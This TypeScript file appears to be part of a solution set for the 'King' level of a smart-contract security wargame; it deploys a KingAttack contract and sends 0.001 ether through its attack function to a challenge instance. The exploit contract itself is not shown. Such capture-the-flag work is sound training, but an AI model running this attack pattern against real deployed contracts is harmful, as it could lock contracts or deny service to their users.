import { KingAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const KING_LEVEL_NAME = "King"

export const kingAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {

            console.log('Deploying KingAttacker.');
            const kingAttacker = await ethereum.deployContract<KingAttack>('KingAttack');

            console.log('Attacker deployed at: ', await kingAttacker.getAddress(), ' Perfoming the attack');
            const value = ethereum.parseEther('0.001');
            const attackTx = await kingAttacker.attack(instanceAddress, { value: value });
            await attackTx.wait();
        }
    }
}